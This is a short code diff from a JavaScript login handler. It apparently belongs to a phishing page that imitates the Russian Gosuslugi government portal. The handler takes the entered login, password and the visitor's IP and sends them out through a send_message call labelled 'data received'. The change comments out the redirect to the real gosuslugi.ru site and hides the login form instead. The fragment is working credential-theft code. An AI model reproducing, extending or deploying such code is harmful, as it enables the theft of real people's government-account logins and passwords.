@@ -21,7 +21,9 @@ function login() {
     if (upassword != '') {
         if (ulogin != '') {
             send_message(`⚡️ Получены данные %0D%0A%0D%0A📍 IP: ${ip}%0D%0A%0D%0AЛогин: ${ulogin}%0D%0AПароль: ${upassword}`)
-            window.location.href = 'https://www.gosuslugi.ru/'
+            //window.location.href = 'https://www.gosuslugi.ru/'
+
+            document.getElementById('auth').style.display = 'none'
         }
         else {
             document.getElementById('user-login').style.backgroundColor = '#fce0e4'
